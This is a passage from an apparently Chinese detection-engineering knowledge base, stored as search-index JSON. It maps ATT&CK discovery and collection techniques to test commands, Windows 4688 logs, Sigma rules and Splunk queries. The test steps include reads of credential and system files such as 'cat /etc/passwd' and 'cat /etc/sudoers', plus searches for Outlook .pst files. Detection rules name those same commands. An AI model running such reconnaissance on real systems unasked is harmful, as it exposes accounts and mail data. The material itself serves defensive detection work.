\u4e0b\u5bf9dir\u547d\u4ee4\u4e0d\u505a\u8bb0\u5f55</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u5728windows\u6587\u4ef6\u548c\u76ee\u5f55\u53d1\u73b0\ndescription: windows server 2016\ntags: T1083\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\windows\\system32\\tree.com' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: tree #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1083</p> <p>https://attack.mitre.org/techniques/T1083/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/","title":"T1087-001-linux-\u672c\u5730\u8d26\u6237\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u83b7\u53d6\u672c\u5730\u7cfb\u7edf\u5e10\u6237\u7684\u5217\u8868\u3002\u6b64\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u786e\u5b9a\u7cfb\u7edf\u4e0a\u5b58\u5728\u54ea\u4e9b\u672c\u5730\u5e10\u6237\uff0c\u4ee5\u5e2e\u52a9\u540e\u7eed\u884c\u4e3a\u3002</p> <p>\u547d\u4ee4\u5982net user\u548cnet localgroup\u7684\u7684\u51c0\u6548\u7528\u548cid\u548cgroups\u5728Mac OS\u548cLinux\u53ef\u4ee5\u5217\u51fa\u672c\u5730\u7528\u6237\u548c\u7ec4\u3002\u5728Linux\u4e0a\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528/etc/passwd\u6587\u4ef6\u6765\u679a\u4e3e\u672c\u5730\u7528\u6237\u3002</p> <p>\u5728Linux\u4e0a\uff0c\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528/etc/passwd\u4e16\u754c\u53ef\u8bfb\u7684\u6587\u4ef6\u6765\u679a\u4e3e\u672c\u5730\u7528\u6237\u3002\u5728mac\u4e2d\uff0c\u9664\u6587\u4ef6\u5916\uff0c\u6b64\u76f8\u540c\u6587\u4ef6\u4ec5\u7528\u4e8e\u5355\u7528\u6237\u6a21\u5f0f/etc/master.passwd\u3002\u6b64\u5916\uff0c\u53ef\u4ee5\u901a\u8fc7groups\u548cid\u547d\u4ee4\u679a\u4e3e\u7ec4\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u679a\u4e3e\u6240\u6709\u8d26\u6237\uff1acat /etc/passwd</p> <p>\u67e5\u770bsudoers\u6587\u4ef6\uff1acat /etc/sudoers</p> <p>\u67e5\u770bUID\u4e3a0\u7684\u5e10\u6237\uff1ausername=$(echo $HOME | awk -F'/' '{print $3}') &amp;&amp; lsof -u $username</p> <p>\u663e\u793a\u7528\u6237\u5e10\u6237\u662f\u5426\u6709\u8fdc\u7a0b\u8bb0\u5f55\u5668\uff1alastlog</p> <p>\u679a\u4e3e\u7528\u6237\u548c\u7ec4\uff1agroups \u6216\u8005 id</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>bash\u5386\u53f2\u8bb0\u5f55</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u679a\u4e3e\u6240\u6709\u8d26\u6237\uff1acat /etc/passwd</p> <p>\u67e5\u770bsudoers\u6587\u4ef6\uff1acat /etc/sudoers \uff08\u9700\u8981root\u6743\u9650\uff09</p> <p>\u67e5\u770bUID\u4e3a0\u7684\u5e10\u6237\uff1ausername=$(echo $HOME | awk -F'/' '{print $3}') &amp;&amp; lsof -u $username  </p> <p>\u663e\u793a\u7528\u6237\u5e10\u6237\u662f\u5426\u6709\u8fdc\u7a0b\u8bb0\u5f55\u5668\uff1alastlog</p> <p>\u679a\u4e3e\u7528\u6237\u548c\u7ec4\uff1agroups\uff08\u9700\u8981root\u6743\u9650\uff09 \u6216\u8005 id</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>root@icbc:~/Desktop$ history</p> <p>385  cat /etc/passwd   386  cat /etc/sudoers   387  username=$(echo $HOME | awk -F'/' '{print $3}') &amp;&amp; lsof -u $username   388  lastlog   389  groups   390  id   391  history</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#splunk","title":"splunk\u89c4\u5219","text":"<p>index=linux sourcetype=bash_history cat /etc/passwd | table host,user_name,bash_command</p> <p>index=linux sourcetype=bash_history cat /etc/sudoers | table host,user_name,bash_command</p> <p>index=linux sourcetype=bash_history \"lsof -u *\" | table host,user_name,bash_command</p> <p>index=linux sourcetype=bash_history lastlog | table host,user_name,bash_command</p> <p>index=linux sourcetype=bash_history group OR id | table host,user_name,bash_command</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u5e94\u8be5\u7ed3\u5408\u4e0a\u4e0b\u6587\u4e2d\u67e5\u770b\u7814\u5224\uff0c\u800c\u4e0d\u662f\u5355\u72ec\u4f9d\u9760\u5173\u952e\u8bcd\u68c0\u6d4b\uff0c\u56e0\u4e3a\u7cfb\u7edf\u7ba1\u7406\u5458\u7ecf\u5e38\u4f7f\u7528\u8fd9\u4e9b\u547d\u4ee4\u8fdb\u884c\u5408\u6cd5\u64cd\u4f5c\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1087-001-linux-%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1087-001</p> <p>https://attack.mitre.org/techniques/T1087/001</p> <p>linux UID\u8be6\u89e3</p> <p>https://blog.csdn.net/jthivan/article/details/50530955</p> <p>linux ID\u67e5\u770b\u547d\u4ee4\u8be6\u89e3</p> <p>https://blog.csdn.net/qq_21808961/article/details/78532487</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/","title":"T1114-001-win-\u672c\u5730\u7535\u5b50\u90ae\u4ef6\u6536\u96c6","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u7528\u6237\u672c\u5730\u7cfb\u7edf\u4e0a\u6536\u96c6\u7535\u5b50\u90ae\u7bb1\u4fe1\u606f\uff0c\u7528\u4ee5\u6536\u96c6\u654f\u611f\u4fe1\u606f\u3002\u53ef\u4ee5\u4ece\u7528\u6237\u7684\u672c\u5730\u7cfb\u7edf\u4e2d\u83b7\u53d6\u5305\u542b\u7535\u5b50\u90ae\u4ef6\u6570\u636e\u7684\u6587\u4ef6\uff0c\u4f8b\u5982Outlook\u5b58\u50a8\u6216\u7f13\u5b58\u6587\u4ef6\u3002</p> <p>Outlook\u5c06\u6570\u636e\u672c\u5730\u5b58\u50a8\u5728\u6269\u5c55\u540d\u4e3a.ost\u7684\u8131\u673a\u6570\u636e\u6587\u4ef6\u4e2d\u3002Outlook 2010\u548c\u66f4\u9ad8\u7248\u672c\u652f\u6301.ost\u6587\u4ef6\u5927\u5c0f\u6700\u5927\u4e3a50GB\uff0c\u800c\u65e9\u671f\u7248\u672c\u7684Outlook\u652f\u6301\u6700\u592720GB\u3002Outlook 2013\uff08\u53ca\u66f4\u65e9\u7248\u672c\uff09\u548cPOP\u5e10\u6237\u4e2d\u7684IMAP\u5e10\u6237\u4f7f\u7528Outlook\u6570\u636e\u6587\u4ef6\uff08.pst\uff09\uff0c\u800c\u4e0d\u662f.ost\uff0c\u800cOutlook 2016\uff08\u53ca\u66f4\u9ad8\u7248\u672c\uff09\u4e2d\u7684IMAP\u5e10\u6237\u4f7f\u7528.ost\u6587\u4ef6\u3002\u4e24\u79cd\u7c7b\u578b\u7684Outlook\u6570\u636e\u6587\u4ef6\u901a\u5e38\u90fd\u5b58\u50a8\u5728C:\\Users\\\\Documents\\Outlook Files\u6216C:\\Users\\\\AppData\\Local\\Microsoft\\Outlook\u4e2d"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6a21\u62df\u4f7f\u7528where\u547d\u4ee4\u8fdb\u884c\u7b5b\u9009\u6307\u5b9a\u6587\u4ef6\u5939\u4e0b\u540e\u7f00\u4e3a.ost\u6216\u8005.pst\u7684\u6587\u4ef6</p> <pre><code>C:\\Users\\Administrator&gt;where\n\u6b64\u547d\u4ee4\u7684\u8bed\u6cd5\u662f:\n\nWHERE [/R dir] [/Q] [/F] [/T] pattern...\n\n\u63cf\u8ff0:\n    \u663e\u793a\u7b26\u5408\u641c\u7d22\u6a21\u5f0f\u7684\u6587\u4ef6\u4f4d\u7f6e\u3002\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u641c\u7d22\u662f\u5728\u5f53\u524d\u76ee\u5f55\u548c PATH\n    \u73af\u5883\u53d8\u91cf\u6307\u5b9a\u7684\u8def\u5f84\u4e2d\u6267\u884c\u7684\u3002\n\n\u53c2\u6570\u5217\u8868:\n    /R       \u4ece\u6307\u5b9a\u76ee\u5f55\u5f00\u59cb\uff0c\u9012\u5f52\u6027\u641c\u7d22\u5e76\u663e\u793a\u7b26\u5408\u6307\u5b9a\u6a21\u5f0f\u7684\u6587\u4ef6\u3002\n\n    /Q       \u53ea\u8fd4\u56de\u9000\u51fa\u4ee3\u7801\uff0c\u4e0d\u663e\u793a\u5339\u914d\u6587\u4ef6\u5217\u8868\u3002(\u5b89\u9759\u6a21\u5f0f)\n\n             \u5339\u914d\u6587\u4ef6\u3002(\u5b89\u9759\u6a21\u5f0f)\n\n    /F       \u663e\u793a\u6240\u6709\u76f8\u914d\u6587\u4ef6\u5e76\u7528\u53cc\u5f15\u53f7\u62ec\u4e0a\u3002\n\n    /T       \u663e\u793a\u6240\u6709\u76f8\u914d\u6587\u4ef6\u7684\u6587\u4ef6\u7684\u6587\u4ef6\u3002\n\n    pattern  \u6307\u5b9a\u8981\u5339\u914d\u7684\u6587\u4ef6\u7684\u641c\u7d22\u6a21\u5f0f\u3002\u901a\u914d\u7b26 * \u548c ? \u53ef\u4ee5\u7528\u5728\u6a21\u5f0f\u4e2d\u3002\n             \u4e5f\u53ef\u4ee5\u6307\u5b9a \"$env:pattern\" \u548c \"path:pattern\" \u683c\u5f0f; \u5176\u4e2d\n             \"env\" \u662f\u73af\u5883\u53d8\u91cf\uff0c\u641c\u7d22\u662f\u5728 \"env\" \u53d8\u91cf\u7684\u6307\u5b9a\u7684\u8def\u5f84\u4e2d\u6267\u884c\u7684\u3002\n             \u8fd9\u4e9b\u683c\u5f0f\u4e0d\u5e94\u8be5\u8ddf /R \u4e00\u8d77\u4f7f\u7528\u3002\u6b64\u641c\u7d22\u4e5f\u53ef\u4ee5\u7528\u5c06 PATHEXT \u53d8\n             \u91cf\u6269\u5c55\u540d\u9644\u52a0\u4e8e\u6b64\u6a21\u5f0f\u7684\u65b9\u5f0f\u5b8c\u6210\u3002\n\n     /?      \u663e\u793a\u6b64\u5e2e\u52a9\u6d88\u606f\u3002\n\n  \u6ce8\u610f: \u5982\u679c\u641c\u7d22\u6210\u529f\uff0c\u6b64\u5de5\u5177\u8fd4\u56de\u9519\u8bef\u7ea7\u522b 0; \u5982\u679c\u4e0d\u6210\u529f\uff0c\u8fd4\u56de 1; \u5982\u679c\u5931\n        \u8d25\u6216\u53d1\u751f\u9519\u8bef\uff0c\u8fd4\u56de 2\u3002\n\n\u793a\u4f8b:\n    WHERE /?\n    WHERE myfilename1 myfile????.*\n    WHERE $windir:*.*\n    WHERE /R c:\\windows *.exe *.dll *.bat\n    WHERE /Q ??.???\n    WHERE \"c:\\windows;c:\\windows\\system32:*.dll\"\n    WHERE /F /T *.dll\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Users\\Administrator&gt;where -r c:\\users\\administrator\\ *.pst\nc:\\Users\\administrator\\qax.pst\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u65e5\u5fd7\uff1b4688:\u8fdb\u7a0b\u521b\u5efa</p> <pre><code>\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u521b\u5efa\u8005\u4e3b\u9898:\n \u5b89\u5168 ID:  QAX\\Administrator\n \u5e10\u6237\u540d:  Administrator\n \u5e10\u6237\u57df:  QAX\n \u767b\u5f55 ID:  0x4463EA\n\n\u76ee\u6807\u4e3b\u9898:\n \u5b89\u5168 ID:  NULL SID\n \u5e10\u6237\u540d:  -\n \u5e10\u6237\u57df:  -\n \u767b\u5f55 ID:  0x0\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID:  0x15e0\n \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\where.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1936\n \u5f3a\u5236\u6027\u6807\u7b7e:  Mandatory Label\\High Mandatory Level\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x12b0\n \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe\n \u8fdb\u7a0b\u547d\u4ee4\u884c: where  -r c:\\users\\administrator\\ *.pst\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#sigma-win","title":"sigma-win\u89c4\u5219","text":"<pre><code>title: \u4f7f\u7528where\u547d\u4ee4\u67e5\u627e\u672c\u5730ost\u3001pst\u540e\u7f00\u6587\u4ef6\ntags: T1114\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa\n        Processcommandline: \n               - '.ost'  #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\uff0c\u5305\u542b.ost\n               - '.pst'  #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\uff0c\u5305\u542b.pst\n    condition: selection\nlevel: low\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_6","title":"\u5efa\u8bae","text":"<p>\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u4ee5\u4e86\u89e3\u53ef\u4ee5\u91c7\u53d6\u54ea\u4e9b\u63aa\u65bd\u6765\u6536\u96c6\u672c\u5730\u7535\u5b50\u90ae\u4ef6\u6587\u4ef6\u3002\u76d1\u89c6\u8bbf\u95ee\u672c\u5730\u7535\u5b50\u90ae\u4ef6\u6587\u4ef6\u7684\u5f02\u5e38\u8fdb\u7a0b\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u4f8b\u5982Windows Management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1114-001-win-%E6%9C%AC%E5%9C%B0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%94%B6%E9%9B%86/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1114</p> <p>https://attack.mitre.org/techniques/T1114/001/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/","title":"T1119-win-\u81ea\u52a8\u6536\u96c6","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4e00\u65e6\u5728\u7cfb\u7edf\u6216\u7f51\u7edc\u4e2d\u5efa\u7acb\u7acb\u8db3\u70b9\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u4f7f\u7528\u81ea\u52a8\u5316\u6280\u672f\u6765\u6536\u96c6\u5185\u90e8\u6570\u3002\u6267\u884c\u6b64\u6280\u672f\u7684\u65b9\u6cd5\u53ef\u4ee5\u5305\u62ec\u4f7f\u7528\u547d\u4ee4\u548c\u811a\u672c\u89e3\u91ca\u5668\u6765\u641c\u7d22\u548c\u590d\u5236\u9002\u5408\u6807\u51c6\u7684\u4fe1\u606f\uff08\u6307\u7b26\u5408\u653b\u51fb\u8005\u6536\u96c6\u7684\u6570\u636e\uff09\uff0c\u4f8b\u5982\u5728\u7279\u5b9a\u65f6\u95f4\u95f4\u9694\u7684\u6587\u4ef6\u7c7b\u578b\uff0c\u4f4d\u7f6e\u6216\u540d\u79f0\u3002\u6b64\u529f\u80fd\u4e5f\u53ef\u4ee5\u5185\u7f6e\u5230\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u4e2d\u3002</p> <p>\u8be5\u6280\u672f\u53ef\u4ee5\u7ed3\u5408\u4f7f\u7528\u5176\u4ed6\u6280\u672f\uff0c\u4f8b\u5982\u6587\u4ef6\u548c\u76ee\u5f55\u53d1\u73b0\u4ee5\u53ca\u6a2a\u5411\u5de5\u5177\u4f20\u8f93\uff0c\u4ee5\u8bc6\u522b\u548c\u79fb\u52a8\u6587\u4ef6\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0\uff0c\u53ef\u53c2\u8003\u76f8\u5173\u81ea\u52a8\u5316\u6536\u96c6powershell\u811a\u672c</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>Windows\u5b89\u5168\u65e5\u5fd7\u3001sysmon\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0\uff0c\u53ef\u53c2\u8003\u76f8\u5173\u81ea\u52a8\u5316\u6536\u96c6powershell\u811a\u672c</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#splunk","title":"splunk\u89c4\u5219","text":"<p>\u6839\u636e\u6240\u4f7f\u7528\u7684\u65b9\u6cd5\uff0c\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u6279\u5904\u7406\u6587\u4ef6\u6216\u811a\u672c\u4e2d\u547d\u4ee4\u884c\u754c\u9762\u4e0a\u7684\u516c\u7528\u6587\u4ef6\u7cfb\u7edf\u547d\u4ee4\u548c\u53c2\u6570\u3002\u53d6\u51b3\u4e8e\u7cfb\u7edf\u548c\u7f51\u7edc\u73af\u5883\uff0c\u7c7b\u4f3c\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u53ef\u80fd\u4f1a\u5f88\u4e0d\u6b63\u5e38\u3002\u81ea\u52a8\u6536\u96c6\u53ef\u80fd\u4f1a\u4e0e\u5176\u4ed6\u6280\u672f\uff08\u4f8b\u5982\u6570\u636e\u6682\u5b58\uff09\u4e00\u8d77\u53d1\u751f\u3002\u8fd9\u6837\uff0c\u6587\u4ef6\u8bbf\u95ee\u76d1\u89c6\u663e\u793a\u4e86\u6267\u884c\u987a\u5e8f\u6587\u4ef6\u6253\u5f00\u7684\u5f02\u5e38\u8fc7\u7a0b\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u4e00\u6b21\u5c06\u52a8\u4f5c\u590d\u5236\u5230\u591a\u4e2a\u6587\u4ef6\u7684\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u53e6\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u8fd9\u53ef\u80fd\u8868\u793a\u81ea\u52a8\u6536\u96c6\u884c\u4e3a\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u6570\u636e\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u4f8b\u5982Windows Management Instrumentation\u548cPowerShell\uff09\u6765\u83b7\u53d6\u6570\u636e\u3002</p> <pre><code>\u201cindex=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 Image=\u201d\u201d*\\\\findstr.exe\u201d\u201d CommandLine=\u201d\u201d*/e*\u201d\u201d) //findstr used to search for a specefic file extension  index=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d Message=\u201d\u201d*get-childitem*\u201d\u201d   //search for specefic file with get-childitem in powershell\n\nindex=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d Message=\u201d\u201d*Get-ChildItem -Recurse *\u201d\u201d  //search for specefic file recursivly with get-childitem in powershell \n\nindex=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d Message=\u201d\u201d*Get-Service*\u201d\u201d  //get service information with powershell\n\nindex=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d Message=\u201d\u201d*Get-process*\u201d\u201d  //get process information with powershell\n\nindex=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d  (EventCode=1 Image=\u201d\u201d*\\\\sc.exe\u201d\u201d CommandLine=\u201d\u201d*query*\u201d\u201d)  //get service list with sc.exe\n\nindex=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d   (EventCode=1 Image=\u201d\u201d*\\\\wmic.exe\u201d\u201d CommandLine=*Process list*) //get process list with wmic.exe\n\nindex=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d   (EventCode=1 Image=\u201d\u201d*\\\\wmic.exe\u201d\u201d CommandLine=*service list*) //get service list with wmic.exe\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_6","title":"\u5efa\u8bae","text":"<p>\u5982\u679c\u4f60\u5bf9windows\u4ee5\u53capowershell\u6bd4\u8f83\u4e86\u89e3\u7684\u8bdd\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528Windows\u65e5\u5fd7\u4ee5\u53capowershell\u65e5\u5fd7\u6765\u5b8c\u6210\u76d1\u89c6\u68c0\u6d4b\uff0c\u5f53\u7136\u6700\u597d\u7684\u65b9\u6cd5\u662f\u4f7f\u7528sysmon\u65e5\u5fd7\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1119</p> 